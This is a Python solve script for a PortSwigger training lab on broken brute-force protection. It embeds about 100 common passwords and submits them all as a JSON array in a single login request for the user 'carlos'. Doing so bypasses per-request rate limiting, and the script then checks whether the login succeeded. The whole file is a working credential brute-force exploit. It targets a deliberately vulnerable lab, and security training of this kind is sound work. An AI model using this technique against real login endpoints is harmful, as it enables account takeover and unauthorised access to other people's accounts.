#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Broken brute-force protection, multiple credentials per request.

Sends a single JSON POST with all passwords as an array,
bypassing per-request rate limiting.
"""

import argparse
import json
import os
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890",
    "michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx",
    "123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter",
    "buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou",
    "2000","charlie","robert","thomas","hockey","ranger","daniel","starwars",
    "klaster","112233","george","computer","michelle","jessica","pepper","1111",
    "zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie",
    "159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer",
    "love","ashley","nicole","chelsea","biteme","matthew","access","yankees",
    "987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom",
    "monitor","monitoring","montana","moon","moscow"
]


def main():
    parser = argparse.ArgumentParser(
        description="Solve Authentication Lab 13 (multi-credential array bypass)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="carlos")
    parser.add_argument(
        "--passwords-file",
        default=os.path.join(os.path.dirname(__file__), "passwords.json"),
        help="JSON file containing password array"
    )
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    if os.path.exists(args.passwords_file):
        with open(args.passwords_file) as f:
            passwords = json.load(f)
    else:
        passwords = DEFAULT_PASSWORDS

    print(f"[*] Sending {len(passwords)} passwords in one request for '{args.username}'...")
    r = s.post(
        f"{lab}/login",
        json={"username": args.username, "password": passwords},
        allow_redirects=False
    )
    print(f"[*] Response status: {r.status_code}")

    if r.status_code == 302:
        print("[+] Login succeeded — following redirect...")
        r2 = s.get(f"{lab}/my-account", allow_redirects=True)
        if args.username in r2.text or "Log out" in r2.text:
            print(f"[+] Lab solved — logged in as {args.username}")
        else:
            print("[?] Redirect followed but account page check inconclusive")
    else:
        print("[-] No redirect — check the password array or endpoint")


if __name__ == "__main__":
    main()
